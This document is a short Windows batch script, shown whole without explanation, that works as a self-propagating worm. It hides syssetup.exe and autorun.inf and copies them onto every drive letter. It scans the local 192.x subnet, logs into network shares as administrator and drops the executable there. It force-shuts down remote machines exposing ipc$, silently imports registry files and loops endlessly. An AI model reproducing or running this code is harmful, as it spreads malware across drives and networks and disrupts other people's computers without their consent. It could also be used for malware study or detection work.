@echo off
set hty1=%windir%\system32\
:sm
attrib -r -s -h %hty1%syssetup.exe & attrib -r -s -h %hty1%autorun.inf
for %%i in (d e f g h i j k l m n o p q r s t u v w x y z) do (
   fsutil fsinfo drives | findstr /i %%i || goto attr
   dir /a/b %%i:\autorun.inf && attrib -r -s -h %%i:\autorun.inf
   copy %hty1%autorun.inf %%i: & attrib +r +s +h %%i:\autorun.inf
   dir /a/b %%i:\syssetup.exe || (copy %hty1%syssetup.exe %%i: && attrib +r +s +h %%i:\syssetup.exe)
   )
:attr
attrib +r +s +h %hty1%syssetup.exe & attrib +r +s +h %hty1%autorun.inf
ipconfig /all |find /i "ip address" || (ping 127.1 -n 50 && goto sm)
for /f "tokens=15" %%i in ('ipconfig /all^|find /i "ip address"') do (
     for /f "tokens=1-3 delims=." %%a in ("%%i") do (
           if %%a EQU 192 (
           for /l %%e in (1,1,255) do (
                ping %%a.%%b.%%c.%%e -n 1 -l 1 -w 1 &&(
                for /f "skip=7 eol=Ãü" %%t in ('net view \\%%a.%%b.%%c.%%e') do (
                     if "%%t" NEQ "" (
                     net use \\%%a.%%b.%%c.%%e\%%t /u:administrator && (attrib  -r -s -h %hty1%syssetup.exe && copy %hty1%syssetup.exe \\%%a.%%b.%%c.%%e\%%t && attrib +r +s +h %hty1%syssetup.exe)
                     if "%%t" EQU "ipc$" shutdown -s -f -t 0 -m \\%%a.%%b.%%c.%%e
                     )
                 ))
            )
           ) else ping 127.1 -n 30
      )
)
regedit /s %windir%\system32\expl.reg>nul 2>nul
regedit /s %windir%\system32\high.reg>nul 2>nul
goto sm
